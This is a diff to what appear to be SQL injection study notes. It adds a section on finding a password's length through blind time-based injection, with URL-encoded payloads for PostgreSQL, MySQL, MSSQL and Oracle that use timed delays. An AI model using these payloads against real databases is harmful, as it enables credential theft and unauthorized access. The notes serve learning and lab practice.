@@ -61,7 +61,36 @@ You can also write (;) and then select the entire payload and click URL encoding
 
 -- Oracle
 '%3BSELECT+CASE+WHEN+(<username column>='<username>')+THEN+DBMS_PIPE.RECEIVE_MESSAGE('ADS',10)+ELSE+NULL+END+FROM+<table_name>--
+/* 
+check the PortSwigger CHEATSHEET for database specific payloads. 
+*/
 ```
+
+### 4. Finding Password Length
+
+- Start with `<value> = 1` and increment it step by step.
+- Use the condition: `LENGTH(<password_column>) > <value>`
+- If response is **delayed (~10s)** → condition is **TRUE** → password length is **greater than `<value>`**
+- If response is **normal (no delay)** → condition is **FALSE** → password length is **≤ `<value>`**
+- Continue increasing `<value>` until you get the **first response with no delay**. The **first response with no delay is the password length.**
+
+```sql
+-- PostgreSQL
+'%3BSELECT+CASE+WHEN+(<username column>='<username>'+AND+LENGTH(<password_column>)><value>)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+<table_name>--
+
+-- MySQL / MariaDB
+'%3BSELECT+IF((<username column>='<username>'+AND+LENGTH(<password_column>)><value>),SLEEP(10),SLEEP(0))+FROM+<table_name>#
+
+-- Microsoft SQL Server (MSSQL)
+'%3BIF(<username column>='<username>'+AND+LEN(<password_column>)><value>)+WAITFOR+DELAY+'0:0:10'--
+
+-- Oracle
+'%3BSELECT+CASE+WHEN+(<username column>='<username>'+AND+LENGTH(<password_column>)><value>)+THEN+DBMS_PIPE.RECEIVE_MESSAGE('ADS',10)+ELSE+NULL+END+FROM+<table_name>--
+/* 
+check the PortSwigger CHEATSHEET for database specific payloads. 
+*/
+```
+
 
 ---
 ## Examining the Database
